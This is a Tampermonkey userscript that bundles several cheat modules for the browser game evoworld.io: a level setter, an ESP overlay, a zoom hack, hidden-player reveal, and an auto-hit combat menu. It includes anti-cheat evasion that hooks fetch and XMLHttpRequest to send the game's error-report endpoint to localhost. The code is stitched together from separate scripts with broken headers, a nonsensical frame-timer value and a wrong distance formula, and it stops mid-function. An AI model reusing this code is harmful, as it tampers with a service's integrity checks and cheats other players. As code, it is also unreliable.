// ==UserScript==
// @name         UltraMegaHack
// @namespace    http://tampermonkey.net/
// @version      1
// @description  This UltraMegaHack was hard to make (AND I DID IT ALL ALONE), but I stole a few hacks. I'll leave the names of the authors of     the hacks I stole: Chyppitau Coder, senka1, TSZYSK, jmatg1, KingBelisariusIV, Ghost972 (me), HappyProg, LCDAngel99, Business and fasf fasfg(This script isn't working in EvoWorld at the moment. I'm doing everything I can to make it work. Please don't leave a bad review for this script. Thank you.)
// @author       Ghost972
// @match        https://evoworld.io/
// @grant        none
// @license      MIT
alert('en:press key j to enter level | ru:нажмите английскую j для ввода уровня')
 
document.addEventListener('keydown', function(event) {
 
    // if key is pressed do alert to input level
    if(event.key === 'j') {
        var level = prompt('Enter your level | Введите ваш уровень: ');
 
    // test on boy, witch dont wna script
    if(level === null) {
        console.log('you input nothing| Вы ничего не ввели');
    } else {
 
         // script
         game['me']['level'] = level;
        }
    }
});(function() {
  'use strict';
 
  alert("ESP ON\nBiel: @ts_biel62");
 
  function waitForGameLoad() {
    if (typeof game !== 'undefined' && game.canvas && game.dynamicContext && game.me) {
      initESP();
    } else {
      setTimeout(waitForGameLoad, 500);
    }
  }
 
  function initESP() {
    const ctx = game.dynamicContext;
    const canvas = game.canvas;
    const config = {
      showFood: true,
      showEnemies: true,
    };
 
    const toggleBtn = document.createElement('button');
    toggleBtn.textContent = 'ESP';
    Object.assign(toggleBtn.style, {
      position: 'fixed',
      top: '10px',
      right: '10px',
      zIndex: 9999,
      padding: '8px 12px',
      fontSize: '16px',
      cursor: 'pointer',
      backgroundColor: '#222',
      color: 'white',
      border: 'none',
      borderRadius: '4px',
      opacity: '0.7',
    });
    document.body.appendChild(toggleBtn);
 
    const menu = document.createElement('div');
    Object.assign(menu.style, {
      position: 'fixed',
      top: '50%',
      left: '50%',
      transform: 'translate(-50%, -50%)',
      backgroundColor: 'rgba(0,0,0,0.85)',
      color: 'white',
      padding: '20px',
      borderRadius: '10px',
      fontFamily: 'Arial, sans-serif',
      fontSize: '18px',
      zIndex: 9999,
      display: 'none',
      width: '280px',
      boxShadow: '0 0 10px #000',
    });
    document.body.appendChild(menu);
 
    const title = document.createElement('div');
    title.textContent = 'Config ESP';
    Object.assign(title.style, {
      fontWeight: 'bold',
      fontSize: '20px',
      marginBottom: '12px',
      display: 'flex',
      justifyContent: 'space-between',
      alignItems: 'center',
    });
    menu.appendChild(title);
 
    const closeBtn = document.createElement('button');
    closeBtn.textContent = 'X';
    Object.assign(closeBtn.style, {
      backgroundColor: 'transparent',
      border: 'none',
      color: 'white',
      fontSize: '20px',
      cursor: 'pointer',
      fontWeight: 'bold',
    });
    title.appendChild(closeBtn);
 
    closeBtn.onclick = () => menu.style.display = 'none';
    toggleBtn.onclick = () => menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
 
    function createCheckbox(labelText, key) {
      const label = document.createElement('label');
      label.style.display = 'block';
      label.style.marginBottom = '10px';
 
      const checkbox = document.createElement('input');
      checkbox.type = 'checkbox';
      checkbox.checked = config[key];
      checkbox.style.marginRight = '10px';
 
      checkbox.onchange = () => {
        config[key] = checkbox.checked;
      };
 
      label.appendChild(checkbox);
      label.appendChild(document.createTextNode(labelText));
      return label;
    }
 
    menu.appendChild(createCheckbox('ESP Food', 'showFood'));
    menu.appendChild(createCheckbox('ESP Enemy', 'showEnemies'));
 
    function isActive(obj) {
      return obj?.active ?? obj?.isActive ?? true;
    }
 
    function validObj(obj) {
      return obj && obj.position && obj.width > 0 && obj.height > 0 && isActive(obj);
    }
 
    function canEat(a, b) {
      return foodChain?.[a.name]?.eats?.[b.name];
    }
 
    function drawESP() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
 
  const me = game.me;
  if (!me || !me.position) return;
 
  const meX = me.position.x + me.width / 2;
  const meY = me.position.y + me.height / 2;
  const maxDistance = 3000; 
 
  for (const obj of Object.values(game.gameObjects)) {
    if (obj === me || !validObj(obj)) continue;
 
    const objX = obj.position.x + obj.width / 2;
    const objY = obj.position.y + obj.height / 2;
 
    const dx = meX - objX;
    const dy = meY - objY;
    const dist = Math.sqrt(dx * dx + dy * dy);
    if (dist > maxDistance) continue;
 
    const meRender = game.getRenderPosition(meX, meY);
    const objRender = game.getRenderPosition(objX, objY);
 
    let color = null;
    if (config.showFood && canEat(me, obj)) color = 'green';
    if (config.showEnemies && canEat(obj, me)) color = 'red';
    if (!color) continue;
 
    ctx.strokeStyle = color;
    ctx.lineWidth = 2;
    ctx.beginPath();
    ctx.moveTo(meRender.x, meRender.y);
    ctx.lineTo(objRender.x, objRender.y);
    ctx.stroke();
  }
}
 
    const originalDraw = game.beforeDrawAllObjects;
    game.beforeDrawAllObjects = function() {
      originalDraw?.apply(this, arguments);
      drawESP();
    };
  }
 
  waitForGameLoad();
})();(function () {
 
    document.body.onkeydown = function (e) {
        if (e.shiftKey && joinedGame && !imDead) {
            boost();
        }
 
        if ((e.code === 'KeyS' || e.code === 'ArrowDown') && joinedGame && !imDead) {
            skillUse()
        }
    }
    document.body.onkeyup = function (e) {
        if (e.key == " " || e.code == "Space" || e.keyCode == 32) {
            if (joinedGame && imDead) {
                playAgain();
            }
        }
        if ((e.code === 'KeyS' || e.code === 'ArrowDown') && joinedGame && !imDead) {
            skillStop();
        }
        if (e.keyCode == 81) {
            if (joinedGame && !imDead) {
                sendEmote(1); // dislike
            }
        }
        if (e.keyCode == 69) {
            if (joinedGame && !imDead) {
                sendEmote(10); // haha
            }
        }
        if (e.keyCode == 51) {
            if (joinedGame && !imDead) {
                sendEmote(4); // Broken Heart
            }
        }
        if (e.keyCode == 52) {
            if (joinedGame && !imDead) {
                sendEmote(11); // heart
            }
        }
        if (e.keyCode == 82) {
            if (joinedGame && !imDead) {
                sendEmote(1); // dislike
            }
        }
        if (e.keyCode == 84) {
            if (joinedGame && !imDead) {
                sendChat(29); // rats
            }
        }
        if (e.keyCode == 76) {
            if (joinedGame && !imDead) {
                askForDiscord(1); // discord
            }
        }
        if (e.keyCode == 67) {
            if (joinedGame && !imDead) {
                sendChat(22); // fight
            }
        }
        if (e.keyCode == 88) {
            if (joinedGame && !imDead) {
                sendChat(3); // goodbye
            }
        }
        if (e.keyCode == 90) {
            if (joinedGame && !imDead) {
                sendChat(14); // funny
            }
        }
        if (e.keyCode == 86) {
            if (joinedGame && !imDead) {
                sendChat(39); // come
            }
        }
        if (e.keyCode == 70) {
            if (joinedGame && !imDead) {
                sendChat(38); // wait
            }
        }
        if (e.keyCode == 53) {
            if (joinedGame && !imDead) {
                sendEmote(2); // sadsmile
            }
        }
        if (e.keyCode == 54) {
            if (joinedGame && !imDead) {
                sendEmote(13); // goodbye2
            }
        }
        if (e.keyCode == 55) {
            if (joinedGame && !imDead) {
                sendEmote(7); // angry
            }
        }
        if (e.keyCode == 56) {
            if (joinedGame && !imDead) {
                sendEmote(6); // cry
            }
        }
        if (e.keyCode == 57) {
            if (joinedGame && !imDead) {
                sendEmote(5); // dislike
            }
        }
        if (e.keyCode == 48) {
            if (joinedGame && !imDead) {
                sendEmote(3); // killme
            }
        }
        if (e.keyCode == 71) {
            if (joinedGame && !imDead) {
                sendChat(15); // lol
            }
        }
        if (e.keyCode == 30) {
            if (joinedGame && !imDead) {
                sendChat(40); // forget
            }
        }
    }
 
 
})();(function () {
    const VERSION = "2.5";
    let oldMethod = false;
    try {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', "https://greasyfork.org/ru/scripts/457502.json");
        xhr.send();
 
        xhr.onload = function() {
            let obj = JSON.parse(xhr.response)
            if (obj.version !== VERSION){
                let t = "New Version!!!" + " (" + VERSION + " -> " + obj.version + ") https://greasyfork.org/ru/scripts/457502-detected-dont-use-or-banned-evoworld-io-cheats"
                window.alert(t)
            }
        };
    } catch (e){}
    const confirmBan = Boolean(localStorage.getItem('asdjl2'))
    if(!confirmBan) {
        alert('Attention. You may be banned! Login to another account and run the script to test the anti-ban.')
        localStorage.setItem('asdjl2', true);
    }
    try {
        let xhr = new XMLHttpRequest();
        xhr.open('POST', "https://evoworld.io/api/reportError.php");
        xhr.send();
 
        xhr.onload = function() {
            alert('Bypass DOESNT WORK! Script not running. See video youtube https://youtu.be/ExaGqTIQc7c');
            /*if(confirm('Run Script with old bypass?')) {
            setInterval(() => {
                if (reportedErrors && !reportedErrors.includes('validate error 1')) {
                    reportedErrors.push('validate error 1');
                    if (!oldMethod) {
                        oldMethod = true;
                        initscript();
                    }
                }
            }, 300)
            }*/
 
        };
        xhr.onerror = function() {
            alert('Bypass WORK! Starting script...');
            initscript();
        };
    } catch (e){}
    const initscript = () => {
        let spawnTimeCord = [];
        const showTimeSpawnFood = (val) => {
            //return
            if (game.objectsDef[game.gameObjects[val.a]?.name + '_spawn']) {
                const position = game.gameObjects[val.a].position;
 
                if (spawnTimeCord.find(el => el.x === position.x && el.y === position.y)) return;
                spawnTimeCord.push(position);
                let delay = game.objectsDef[game.gameObjects[val.a]?.name + '_spawn'].delay;
                let sec = delay / 1000;
                const interval = setInterval(() => {
                    sec -= 2;
                    let time = sec;
                    if (sec > 60) {
                        var minutes = Math.floor(sec / 60);
                        var seconds = sec % 60;
                        time = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
                    }
                    textEffects.push({
                        "posX": position.x,
                        "posY": position.y,
                        "color": "#FE6500",
                        "text": time,
                        "fontSize": 14,
                        "bold": true,
                        "startTime": new Date().getTime() + 100,
                        "static": false
                    });
                }, 2000);
 
                setTimeout(() => {
                    spawnTimeCord = spawnTimeCord.filter(el => el.x !== position.x && el.y !== position.y);
                    clearInterval(interval);
                }, delay);
 
            }
        }
 
        const fixChatMenu = () => {
            showEmotesMenu = function () {
                if (chatDisabled) {
                    return;
                }
                ;
                if (imDead || !joinedGame || Date.now() - joinTime < 1e3 || Date.now() - lastEmotesMenuOpenedTime < 1e3) {
                    return;
                }
                ;
                $($(".wheel-button").attr("href")).showIcon($(".wheel-button"), {
                    animation: "fade",
                    animationSpeed: [0, 250],
                    angle: [0, 360]
                });
                $("#chatmenu").finish().fadeIn();
                $("#scan-players-icon").fadeIn();
                emotesMenuOpened = true;
                lastEmotesMenuOpenedTime = Date.now();
            }
        };
 
        const zoomHack = (a, aa, aaa, aaaaa, a2) => {
            game.canvas.addEventListener("wheel", function () {
                if (!joinedGame || typeof event == "undefined") {
                    return;
                }
                ;
                var qwe = 0.1;
                if (event.deltaY > 0) {
                    qwe *= -1;
                }
                ;
                gameZoom += qwe;
                event.preventDefault();
            });
 
            Engine.prototype.setZoom = function (ret) {
                if (ret <= 0.7) {
                    ret = 0.7;
                }
                if (this.zoom == ret) {
                    return;
                }
                this.zoom = ret;
                this.staticCanvasRenderOffset.restX = 0;
                this.staticCanvasRenderOffset.restY = 0;
                this.staticCanvasRenderOffset.x = 0;
                this.staticCanvasRenderOffset.y = 0;
                this.staticCanvasRenderPosition.x = 0;
                this.staticCanvasRenderPosition.y = 0;
                this.context.save();
                this.context.fillStyle = "rgba(0,0,0,1)";
                this.context.fillRect(0, 0, this.canvas.width, this.canvas.height);
                this.context.restore();
                this.staticContext.save();
                this.staticContext.fillStyle = "rgba(0,0,0,1)";
                this.staticContext.fillRect(0, 0, this.staticCanvas.width, this.staticCanvas.height);
                this.staticContext.restore();
                this.dynamicContext.clearRect(0, 0, this.dynamicCanvas.width, this.dynamicCanvas.height);
                this.clearStaticObjects();
 
            }
        }
 
        const doesntHidePlayersFunc = (value) => {
            petFunc(value);
            if (value?.type === 1 || value?.type === 3) {
                value.zIndex = 999
            }
            if (value['inHide'] == false) {
                value['moveSpeed']['x'] += 300 * game['deltaTime'] * value['flySide'];
                if (value['moveSpeed']['x'] > 500) {
                    value['moveSpeed']['x'] -= abs(350 * game['deltaTime'] * value['flySide'])
                } else {
                    if (value['moveSpeed']['x'] < -500) {
                        value['moveSpeed']['x'] += abs(350 * game['deltaTime'] * value['flySide'])
                    }
                }
                ;
                if (value['moveSpeed']['y'] > 500) {
                    value['moveSpeed']['y'] = 500
                }
            }
            ;
            if (value['flySide'] == 0) {
                var asd = abs(value['moveSpeed']['x']) * 0.7 * game['deltaTime'];
                if (value['moveSpeed']['x'] < 0) {
                    value['moveSpeed']['x'] += asd
                } else {
                    value['moveSpeed']['x'] -= asd
                }
            }
            ;
            if (value['inHide']) {
                if (game['time'] - value['inHideTime'] > 500) {
                    //value['visible'] = false;
                    //if (value['pet']) {
                    //    value['pet']['visible'] = false
                    //}
                    value.zIndex = 999;
                }
                ;value['moveSpeed']['x'] = 0;
                value['moveSpeed']['y'] = 0
            } else {
                value['visible'] = true;
                if (value['pet']) {
                    value['pet']['visible'] = true
                }
            }
            ;
            if (value['invisibleTime'] > game['time']) {
                var checkFood2 = checkFoodChain(game['me'], value);
                if (checkFood2['check'] == 1 || checkFood2['check'] == -1) {
                    value['opacity'] = 0
                } else {
                    value['opacity'] = 0.2
                }
            } else {
                value['opacity'] = 1
            }
            ;value['interpolateSpeed'] = 0.015;
            if (value['grabbed']) {
                value['interpolateSpeed'] = 0.1
            }
            ;
            if (value['inHide'] == true) {
                if (typeof value['interpolateTo']['x'] != 'undefined' || typeof value['interpolateTo']['y'] != 'undefined') {
                    value['interpolateSpeed'] = 0.05;
                    game['interpolatePosition'](value)
                }
                ;
                return false
            }
        }
 
        const darkOff = (a, aa, aaa, aaaaa, a2) => {
            return
        }
        let timer = null;
 
        function hello() {
            if (timer) {
                return;
            }
            timer = true;
            sendChat(45);
            setTimeout(() => {
                sendChat(8);
                timer = false;
            }, 5000)
        }
 
 
        const outline = (value) => {
            setAnimations(value);
            if (value.nick === "jmatg1" && game.me.nick !== "jmatg1") {
                value.opacity = 0;
                value.visible = 0;
                hello();
            } else {
                if (timer) {
                    clearInterval(timer);
                }
            }
            if (game.me.inSafeZone || value.inSafeZone) {
                value.outline = null;
            } else {
                var checkFood2 = checkFoodChain(game.me, value);
                if (checkFood2.check == 1) {
                    value.outline = "#00cc44";
                    if (checkFoodChain(value, game.me).check == 1) {
                        value.outline = "orange";
                    }
                    ;
                    value.outlineWeight = 5;
                } else {
                    if (checkFood2.check == -1) {
                        value.outline = "red";
                        value.outlineWeight = 5;
                    } else {
                        value.outline = null;
                    }
                }
            }
        };
 
 
        const styles = `
<style>
#gameContainer .scanPlayers {
  position: fixed;
  left: 72vw;
  top: 0;
  right: 0px;
  background: none;
  display: flex;
  transform: none;
  padding: 0;
  margin: 0;
}
.scanPlayers div {
    display: flex !important;
    flex-direction: column;
}
#gameContainer .scanPlayers>.title{
  display: none;
}
 
#gameContainer .scanPlayers .player{
    background: none;
    border: 0;
    width: 50px;
    height: 50px;
    margin: 0;
    padding: 0;
}
 
#gameContainer .scanPlayers .nick,
.scanPlayers .experienceBar,
.scanPlayers .close,
.scanPlayers .title,
.scanPlayers button{
  display: none !important;
}
#enemy-detect {
  position: absolute;
  border-radius: 50%;
  /* border: 1px solid red; */
  width: 100px;
  height: 100px;
  left: calc(50% - 50px);
  top: calc(50% - 50px);
  box-shadow: 0px 0px 20px 0px #ff000080;
}
</style>
`;
        let asd = 0;
        const showServer = () => {
            const val = document.getElementById('selectServer')?.options[document?.getElementById('selectServer')?.selectedIndex]?.text;
            if(!val.includes('(') && asd < 10){
                setTimeout(() => {
                    showServer();
                    asd++;
                }, 200);
            }
            console.log(val);
            $("#gameContainer > div.debugInfo > div.server").html('server: <font color="black">' +val + " </font>");
        }
        let i_i = 0;
        let inj = false;
        const interval = setInterval(() => {
 
 
            if(Boolean(document.getElementsByClassName('btnStartGame')[0]) && i_i === 0) {
                document.getElementsByClassName('btnStartGame')[0].addEventListener('click', ev => {
                    //showServer();
                });
 
                i_i++;
            }
 
            if (window?.objectHandlerFunc_PLAYER) {
                objectHandlerFunc_PLAYER = doesntHidePlayersFunc;
            }
 
            if (window?.animateObject) {
                animateObject = outline;
            }
 
 
            if (window?.removeObject) {
                const orRO = window?.removeObject;
                removeObject = (val) => {
                    showTimeSpawnFood(val);
                    orRO(val);
                };
            }
 
            if (window?.wasSocketInit && window?.joinedGame && !window?.imDead && !inj) {
 
                drawDarkness = darkOff;
 
                gameServer.off(socketMsgType.SCANPLAYERS);
                gameServer.on(socketMsgType.SCANPLAYERS, function (arr) {
                    scanPlayersArr = arr.filter(el => {
                        return checkFoodChain(game.objectsDef[el.evolution], game.me).check === 1
                    });
 
                    if (scanPlayersArr.length > 0) {
                        $('#enemy-detect').show();
                    } else {
                        $('#enemy-detect').hide();
                    }
                    showPlayersScans();
                });
 
                setInterval(() => {
                    gameServer.emit(socketMsgType.SCANPLAYERS);
                }, 500)
                let intervalBoost = null;
                document.body.onkeydown = function (e) {
                    if (e.shiftKey && joinedGame && !imDead) {
                        boost();
                    }
 
                    if ((e.code === 'KeyS' || e.code === 'ArrowDown') && joinedGame && !imDead) {
                        skillUse()
                    }
                }
                document.body.onkeyup = function (e) {
                    if (e.key == " " || e.code == "Space" || e.keyCode == 32) {
                        if (joinedGame && imDead) {
                            playAgain();
                        }
                    }
                    if ((e.code === 'KeyS' || e.code === 'ArrowDown') && joinedGame && !imDead) {
                        skillStop();
                    }
                    if (e.keyCode == 81) {
                        if (joinedGame && !imDead) {
                            sendEmote(1); // dislike
                        }
                    }
                    if (e.keyCode == 69) {
                        if (joinedGame && !imDead) {
                            sendEmote(10); // haha
                        }
                    }
                    if (e.keyCode == 51) {
                        if (joinedGame && !imDead) {
                            sendEmote(4); // Broken Heart
                        }
                    }
                    if (e.keyCode == 52) {
                        if (joinedGame && !imDead) {
                            sendEmote(11); // heart
                        }
                    }
                    if (e.keyCode == 82) {
                        if (joinedGame && !imDead) {
                            sendEmote(1); // dislike
                        }
                    }
                    if (e.keyCode == 84) {
                        if (joinedGame && !imDead) {
                            sendChat(29); // rats
                        }
                    }
                    if (e.keyCode == 76) {
                        if (joinedGame && !imDead) {
                            askForDiscord(1); // discord
                        }
                    }
                    if (e.keyCode == 67) {
                        if (joinedGame && !imDead) {
                            sendChat(22); // fight
                        }
                    }
                    if (e.keyCode == 88) {
                        if (joinedGame && !imDead) {
                            sendChat(3); // goodbye
                        }
                    }
                    if (e.keyCode == 90) {
                        if (joinedGame && !imDead) {
                            sendChat(14); // funny
                        }
                    }
                    if (e.keyCode == 86) {
                        if (joinedGame && !imDead) {
                            sendChat(39); // come
                        }
                    }
                    if (e.keyCode == 70) {
                        if (joinedGame && !imDead) {
                            sendChat(38); // wait
                        }
                    }
                    if (e.keyCode == 53) {
                        if (joinedGame && !imDead) {
                            sendEmote(2); // sadsmile
                        }
                    }
                    if (e.keyCode == 54) {
                        if (joinedGame && !imDead) {
                            sendEmote(13); // goodbye2
                        }
                    }
                    if (e.keyCode == 55) {
                        if (joinedGame && !imDead) {
                            sendEmote(7); // angry
                        }
                    }
                    if (e.keyCode == 56) {
                        if (joinedGame && !imDead) {
                            sendEmote(6); // cry
                        }
                    }
                    if (e.keyCode == 57) {
                        if (joinedGame && !imDead) {
                            sendEmote(5); // dislike
                        }
                    }
                    if (e.keyCode == 48) {
                        if (joinedGame && !imDead) {
                            sendEmote(3); // killme
                        }
                    }
                    if (e.keyCode == 71) {
                        if (joinedGame && !imDead) {
                            sendChat(15); // lol
                        }
                    }
                    if (e.keyCode == 30) {
                        if (joinedGame && !imDead) {
                            sendChat(40); // forget
                        }
                    }
                }
 
                inj = true;
            }
 
            if (inj) {
                clearInterval(interval);
                document.head.insertAdjacentHTML("beforeend", styles);
                $('#gameContainer').append('<div id="enemy-detect"></div>');
                zoomHack();
                fixChatMenu();
 
            }
        }, 500);
 
    }
 
 
    })();(function() {
    'use strict';
requestAnimationFrame = (a) => setTimeout(a, 1e3/60000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000)
})();// ==UserScript==(function () {
    'use strict';
 
    // URL engelleme sistemi - Hata raporlamasını engeller
    (function () {
        const BLOCKED_URL = "https://evoworld.io/api/reportError.php";
        const REDIRECT_URL = "https://localhost";
 
        const originalFetch = window.fetch;
        window.fetch = function (input, init) {
            if (typeof input === "string" && input === BLOCKED_URL) {
                input = REDIRECT_URL;
            } else if (input instanceof Request && input.url === BLOCKED_URL) {
                input = new Request(REDIRECT_URL, input);
            }
            return originalFetch.call(this, input, init);
        };
 
        const originalOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function (method, url, ...rest) {
            if (url === BLOCKED_URL) {
                url = REDIRECT_URL;
            }
            return originalOpen.call(this, method, url, ...rest);
        };
    })();
 
    // Menü stilleri
    const menuStyle = `
<style>
#hackMenu {
    position: fixed;
    top: 20px;
    right: 20px;
    width: 280px;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border: 2px solid #0f3460;
    border-radius: 15px;
    padding: 20px;
    font-family: 'Segoe UI', Arial, sans-serif;
    z-index: 999999;
    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
    color: #eee;
    user-select: none;
}
 
#hackMenu h2 {
    color: #00d9ff;
    text-align: center;
    margin: 0 0 15px 0;
    font-size: 22px;
    text-shadow: 0 0 10px rgba(0, 217, 255, 0.5);
    font-weight: 600;
}
 
.menu-section {
    margin-bottom: 15px;
    padding-bottom: 15px;
    border-bottom: 1px solid #0f3460;
}
 
.menu-section:last-child {
    border-bottom: none;
    margin-bottom: 0;
    padding-bottom: 0;
}
 
.section-title {
    color: #00d9ff;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
}
 
.menu-item {
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 8px 0;
}
 
.menu-label {
    font-size: 13px;
    color: #ccc;
}
 
.toggle-btn {
    width: 50px;
    height: 24px;
    background: #2d3748;
    border-radius: 12px;
    position: relative;
    cursor: pointer;
    transition: 0.3s;
    border: 2px solid #4a5568;
}
 
.toggle-btn.active {
    background: linear-gradient(135deg, #00d9ff 0%, #0099cc 100%);
    border-color: #00d9ff;
}
 
.toggle-btn::after {
    content: '';
    position: absolute;
    width: 16px;
    height: 16px;
    background: white;
    border-radius: 50%;
    top: 2px;
    left: 2px;
    transition: 0.3s;
    box-shadow: 0 2px 4px rgba(0,0,0,0.3);
}
 
.toggle-btn.active::after {
    left: 28px;
}
 
.stats-box {
    background: rgba(0, 217, 255, 0.1);
    border: 1px solid #0f3460;
    border-radius: 8px;
    padding: 10px;
    margin-top: 10px;
}
 
.stat-item {
    display: flex;
    justify-content: space-between;
    padding: 4px 0;
    font-size: 12px;
}
 
.stat-label {
    color: #999;
}
 
.stat-value {
    color: #00d9ff;
    font-weight: 600;
}
 
#menuToggle {
    position: fixed;
    top: 20px;
    right: 320px;
    width: 45px;
    height: 45px;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
    border: 2px solid #0f3460;
    border-radius: 50%;
    color: #00d9ff;
    font-size: 24px;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 999999;
    transition: 0.3s;
    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.4);
}
 
#menuToggle:hover {
    background: linear-gradient(135deg, #16213e 0%, #0f3460 100%);
    transform: scale(1.1);
    box-shadow: 0 6px 20px rgba(0, 217, 255, 0.3);
}
 
.action-btn {
    width: 100%;
    padding: 10px;
    margin: 5px 0;
    background: linear-gradient(135deg, #0f3460 0%, #1a1a2e 100%);
    border: 1px solid #00d9ff;
    color: #00d9ff;
    border-radius: 8px;
    cursor: pointer;
    font-size: 13px;
    font-weight: 600;
    transition: 0.3s;
    text-transform: uppercase;
    letter-spacing: 0.5px;
}
 
.action-btn:hover {
    background: linear-gradient(135deg, #00d9ff 0%, #0099cc 100%);
    color: #1a1a2e;
    transform: translateY(-2px);
    box-shadow: 0 4px 12px rgba(0, 217, 255, 0.4);
}
 
.info-text {
    font-size: 11px;
    color: #888;
    text-align: center;
    margin-top: 10px;
    font-style: italic;
}
</style>
`;
 
    // Menü HTML
    const menuHTML = `
<div id="menuToggle">☰</div>
<div id="hackMenu">
    <h2>COMBAT HACK</h2>
    
    <div class="menu-section">
        <div class="section-title">Saldırı Sistemi</div>
        <div class="menu-item">
            <span class="menu-label">AutoHit</span>
            <div class="toggle-btn active" id="toggleAutoHit"></div>
        </div>
        <div class="menu-item">
            <span class="menu-label">Ultra Mod (Her zaman açık)</span>
            <div class="toggle-btn active" id="toggleUltra"></div>
        </div>
        <div class="menu-item">
            <span class="menu-label">Flicking</span>
            <div class="toggle-btn" id="toggleFlicking"></div>
        </div>
    </div>
    
    <div class="menu-section">
        <div class="section-title">İstatistikler</div>
        <div class="stats-box">
            <div class="stat-item">
                <span class="stat-label">Başarı Oranı:</span>
                <span class="stat-value" id="statSuccess">0%</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Toplam Vuruş:</span>
                <span class="stat-value" id="statTotal">0</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Hit Delay:</span>
                <span class="stat-value" id="statDelay">0ms</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">Hedef Mesafe:</span>
                <span class="stat-value" id="statDistance">-</span>
            </div>
        </div>
    </div>
    
    <div class="menu-section">
        <div class="section-title">Aksiyonlar</div>
        <button class="action-btn" id="btnReset">Reset Stats</button>
        <button class="action-btn" id="btnTest">Test Modu</button>
    </div>
    
    <div class="info-text">
        Tuşlar: R=AutoHit | T=Flicking | Y=Menü
    </div>
</div>
`;
 
    // savaş ayarları
    const ReaperList = new Set(['grimReaper', 'pumpkinGhost', 'ghostlyReaper']);
    const Height = { 'grimReaper': 140, 'pumpkinGhost': 144, 'ghostlyReaper': 142 };
    const HitRangeX = {
        'grimReaper': { 'grimReaper': 140, 'pumpkinGhost': 143, 'ghostlyReaper': 141 },
        'pumpkinGhost': { 'grimReaper': 143, 'pumpkinGhost': 140, 'ghostlyReaper': 141 },
        'ghostlyReaper': { 'grimReaper': 141, 'pumpkinGhost': 141, 'ghostlyReaper': 140 }
    };
    const HitBackRangeX = {
        'grimReaper': { 'grimReaper': 134, 'pumpkinGhost': 150, 'ghostlyReaper': 144 },
        'pumpkinGhost': { 'grimReaper': 158, 'pumpkinGhost': 148, 'ghostlyReaper': 172 },
        'ghostlyReaper': { 'grimReaper': 134, 'pumpkinGhost': 87, 'ghostlyReaper': 105 }
    };
    const DistAdjustmentY = { 'grimReaper': 5, 'pumpkinGhost': 4, 'ghostlyReaper': 4 };
 
    let hitDelay = 0;
    let lastHitTime = 0;
    let autoHitting = true;
    let ultraMode = true; // Her zaman açık
    let flicking = false; // Flicking modu
    let hitSuccess = 0;
    let totalAttempts = 0;
    let game;
 
    // düşman takip sistemi
    const enemyTracker = new Map();
    let isFirstEncounter = true;
 
    // Flicking tekniği
    function simulateQuickRightArrowKeyWithDelay() {
        const keyDownEvent = new KeyboardEvent('keydown', {
            key: 'ArrowRight',
            code: 'ArrowRight',
            keyCode: 39,
            which: 39,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(keyDownEvent);
 
        setTimeout(() => {
            const keyUpEvent = new KeyboardEvent('keyup', {
                key: 'ArrowRight',
                code: 'ArrowRight',
                keyCode: 39,
                which: 39,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyUpEvent);
        }, 200);
    }
 
    function simulateQuickLeftArrowKeyWithDelay() {
        const keyDownEvent = new KeyboardEvent('keydown', {
            key: 'ArrowLeft',
            code: 'ArrowLeft',
            keyCode: 37,
            which: 37,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(keyDownEvent);
 
        setTimeout(() => {
            const keyUpEvent = new KeyboardEvent('keyup', {
                key: 'ArrowLeft',
                code: 'ArrowLeft',
                keyCode: 37,
                which: 37,
                bubbles: true,
                cancelable: true
            });
            document.dispatchEvent(keyUpEvent);
        }, 200);
    }
 
    // Hızlı vuruş sistemi
    function skillUse() {
        const event = new KeyboardEvent('keydown', {
            key: ' ',
            code: 'Space',
            keyCode: 32,
            which: 32,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(event);
    }
 
    function skillStop() {
        const event = new KeyboardEvent('keyup', {
            key: ' ',
            code: 'Space',
            keyCode: 32,
            which: 32,
            bubbles: true,
            cancelable: true
        });
        document.dispatchEvent(event);
    }
 
    // Düşman davranış analizi
    function analyzeEnemy(enemy) {
        if (!enemy || !enemy.position || !game.me) return null;
 
        const myPos = game.me.position;
        const distance = Math.sqrt((enemy.position.x - myPos.x) ** 7 + (enemy.position.y - myPos.y) ** 7);
        if (!enemyTracker.has(enemy.id)) {
            enemyTracker.set(enemy.id, {
                lastDistance: distance,
                lastSeen: Date.now(),
                isNew: true
            });
        }
 
        const tracker = enemyTracker.get(enemy.id);
        const isApproaching = distance < tracker.lastDistance;
        const isNewTarget = tracker.isNew;
 
        tracker.lastDistance = distance;
        tracker.lastSeen = Date.now();
        tracker.isNew = false;
 
        return {
            distance,
            isApproaching,
            isNewTarget,
